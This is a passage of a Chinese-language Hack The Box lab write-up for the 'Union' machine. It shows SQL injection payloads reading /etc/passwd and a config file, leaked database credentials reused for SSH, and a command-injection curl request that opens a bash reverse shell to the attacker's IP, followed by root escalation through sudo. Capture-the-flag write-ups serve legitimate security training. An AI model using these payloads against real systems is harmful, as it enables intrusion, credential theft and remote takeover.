class="hljs-punctuation">: </span>PHPSESSID=jv95ej2q3d1mmegka4qv15ikj8<br><br><span class="language-llvm">player<span class="hljs-operator">=</span>&#x27; union <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">one</span>) from flag<span class="hljs-comment">;-- -</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>11、查询play的值内容</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.128<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>60<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.128<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.128/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jv95ej2q3d1mmegka4qv15ikj8<br><br><span class="language-q">player=&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> group_concat(player) <span class="hljs-keyword">from</span> players;-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>12、我们把获取的flag值在该页面上进行输入</p>
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>13、页面会跳转到 &#x2F;firewall.php 页面下</p>
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>14、在跳转后的页面上继续输入flag信息</p>
+<p><a target="_blank" rel="noopener" href="http://10.10.11.128/firewall.php">http://10.10.11.128/firewall.php</a></p>
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Join </span>the UHC - November Qualifiers<br>Welcome <span class="hljs-keyword">Back!</span><br><span class="hljs-keyword"></span>Your IP <span class="hljs-keyword">Address </span>has now <span class="hljs-keyword">been </span>granted SSH Access.<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>15、那我们继续扫描下这个端口是否开放吧</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">22</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.128</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">10</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">08</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.128</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.16</span>s latency).<br><br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">0.46</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>16、确实开放 了，那我们得获取到本地的账号密码信息才行，这里先利用SQL注入读取下password文件</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.128<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>50<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.128<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.128/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jv95ej2q3d1mmegka4qv15ikj8<br><br><span class="language-awk">player=<span class="hljs-string">&#x27; union select load_file(&#x27;</span><span class="hljs-regexp">/etc/</span>passwd<span class="hljs-string">&#x27;);-- </span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/14.png" srcset="/img/loading.gif" lazyload></p>
+<p>17、读取下网站的配置信息看看</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.128<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>64<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.128<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.128/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jv95ej2q3d1mmegka4qv15ikj8<br><br><span class="language-reasonml">player=&#x27; union select load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">config</span>.<span class="hljs-params">php</span>&#x27;)</span>;-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Union-htb-writeup/15.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">Sorry, <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">session_start</span>();<br>  <span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>  <span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;uhc&quot;</span>;<br>  <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;uhc-11qual-global-pw&quot;</span>;<br>  <span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;november&quot;</span>;<br><br>  <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-meta">?&gt;</span><br> you are not eligible due to already qualifying.<br></code></pre></td></tr></table></figure>
+
+<p>18、到这里，我们尝试使用该账号密码去登录系统</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh uhc@<span class="hljs-number">10.10</span>.<span class="hljs-number">11.128</span>             <br>The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-string">&#x27;10.10.11.128 (10.10.11.128)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:hE6H4DrsHebfs+gclhz9SL77tMpy8aKR3vp8Y0NRDvY.</span><br><span class="hljs-string">This host key is known by the following other names/addresses:</span><br><span class="hljs-string">    ~/.ssh/known_hosts:29: [hashed name]</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.128</span><span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">uhc@10.10.11.128&#x27;</span>s password: <br>Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">20.04</span>.<span class="hljs-number">3</span> LTS (GNU/Linux <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">77</span>-generic x86_64)<br><br> * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span><br> * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span><br> * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span><br><br><span class="hljs-number">0</span> updates can be applied immediately.<br><br><br>The list <span class="hljs-keyword">of</span> available updates <span class="hljs-keyword">is</span> more than a week <span class="hljs-keyword">old</span>.<br><span class="hljs-keyword">To</span> check <span class="hljs-keyword">for</span> <span class="hljs-keyword">new</span> updates run: sudo apt update<br><br>Last login: Mon Nov  <span class="hljs-number">8</span> <span class="hljs-number">21</span>:<span class="hljs-number">19</span>:<span class="hljs-number">42</span> <span class="hljs-number">2021</span> <span class="hljs-keyword">from</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.8</span><br>uhc@<span class="hljs-keyword">union</span>:~$ id<br>uid=<span class="hljs-number">1001</span>(uhc) gid=<span class="hljs-number">1001</span>(uhc) groups=<span class="hljs-number">1001</span>(uhc)<br>uhc@<span class="hljs-keyword">union</span>:~$ <br></code></pre></td></tr></table></figure>
+
+<p>19、OK的，那获取下第一个flag信息吧</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">uhc<span class="hljs-variable">@union</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls<br>user.txt<br>uhc<span class="hljs-variable">@union</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat user.txt <br><span class="hljs-number">9607</span>b165bcfc305203fff898dfbff15d<br>uhc<span class="hljs-variable">@union</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>20、我们在分析网站的 firewall.php 文件时，发现该文件可以命令执行</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">uhc@union:~$ cd /var/www/html/</span><br><span class="language-xml">uhc@union:/var/www/html$ ls -la</span><br><span class="language-xml">total 16</span><br><span class="language-xml">drwxr-xr-x 1 root root   94 Nov  8  2021 .</span><br><span class="language-xml">drwxr-xr-x 1 root root    8 Jul  2  2021 ..</span><br><span class="language-xml">-rw-r--r-- 1 htb  htb  1203 Nov  5  2021 challenge.php</span><br><span class="language-xml">-rw-r--r-- 1 htb  htb   207 Nov  4  2021 config.php</span><br><span class="language-xml">drwxr-xr-x 1 htb  htb    34 Nov  4  2021 css</span><br><span class="language-xml">-rw-r--r-- 1 htb  htb  1028 Nov  5  2021 firewall.php</span><br><span class="language-xml">-rw-r--r-- 1 htb  htb  2093 Nov  4  2021 index.php</span><br><span class="language-xml">uhc@union:/var/www/html$ cat firewall.php </span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;Authenticated&#x27;</span>])) &#123;</span><br><span class="language-php">  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access Denied&quot;</span>;</span><br><span class="language-php">  <span class="hljs-keyword">exit</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bootstrap-css&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!------ Include the above in your HEAD tag ----------&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-center m-5&quot;</span>&gt;</span>Join the UHC - November Qualifiers<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container p-5&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="language-php">    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="language-php">  &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="language-php">  &#125;;</span><br><span class="language-php">  <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;sudo /usr/sbin/iptables -A INPUT -s &quot;</span> . <span class="hljs-variable">$ip</span> . <span class="hljs-string">&quot; -j ACCEPT&quot;</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-white&quot;</span>&gt;</span>Welcome Back!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-white&quot;</span>&gt;</span>Your IP Address has now been granted SSH Access.<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">uhc@union:/var/www/html$ </span><br></code></pre></td></tr></table></figure>
+
+<p>21、这里对用户的输入没有过滤，导致产生命令执行漏洞，下面尝试利用下</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌─[us-vip<span class="hljs-number">-22</span>]─[<span class="hljs-number">10.10</span>.<span class="hljs-number">14.2</span>]─[shiyan<span class="hljs-variable">@htb</span>-lnf0ywzdjr]─[~/<span class="hljs-title class_">Desktop</span>]<br>└──╼ [★]<span class="hljs-variable">$ </span>curl -X <span class="hljs-title class_">GET</span> -H <span class="hljs-string">&#x27;X-FORWARDED-FOR: ;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1&quot;;&#x27;</span> --cookie <span class="hljs-string">&quot;PHPSESSID=vflfp91f6ua2otqaa2unqdrd4v&quot;</span> <span class="hljs-string">&#x27;http://10.10.11.128/firewall.php&#x27;</span><br><br>┌─[us-vip<span class="hljs-number">-22</span>]─[<span class="hljs-number">10.10</span>.<span class="hljs-number">14.2</span>]─[shiyan<span class="hljs-variable">@htb</span>-lnf0ywzdjr]─[~/<span class="hljs-title class_">Desktop</span>]<br>└──╼ [★]<span class="hljs-variable">$ </span>nc -lvnp <span class="hljs-number">4444</span><br>listening on [any] <span class="hljs-number">4444</span> ...<br>connect to [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.2</span>] from (<span class="hljs-title class_">UNKNOWN</span>) [<span class="hljs-number">10.10</span>.<span class="hljs-number">11.128</span>] <span class="hljs-number">49146</span><br><span class="hljs-symbol">bash:</span> cannot set terminal process group (<span class="hljs-number">718</span>): <span class="hljs-title class_">Inappropriate</span> ioctl <span class="hljs-keyword">for</span> device<br><span class="hljs-symbol">bash:</span> no job control <span class="hljs-keyword">in</span> this shell<br>www-data<span class="hljs-variable">@union</span><span class="hljs-symbol">:~/html</span><span class="hljs-variable">$ </span>sudo -l<br>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> www-data on <span class="hljs-symbol">union:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> www-data may run the following commands on <span class="hljs-symbol">union:</span><br>    (<span class="hljs-title class_">ALL</span> : <span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> <span class="hljs-title class_">ALL</span><br>www-data<span class="hljs-variable">@union</span><span class="hljs-symbol">:~/html</span>$<br></code></pre></td></tr></table></figure>
+
+<p>22、呢就获取下最终的flag信息吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@union:~/html$ sudo -i<br>sudo -i<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span><br>root.txt<br>snap<br><span class="hljs-built_in">cat</span> root.txt<br>15f16a14142dfe8f004cfccdc32f8cdb<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/418</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Union-htb-writeup</div>
+      <div>https://sh1yan.top/2024/10/13/Union-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/10/Outdated-htb-writeup/" title="Outdated-htb-writeup">
+                        <span class="hidden-mobile">Outdated-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
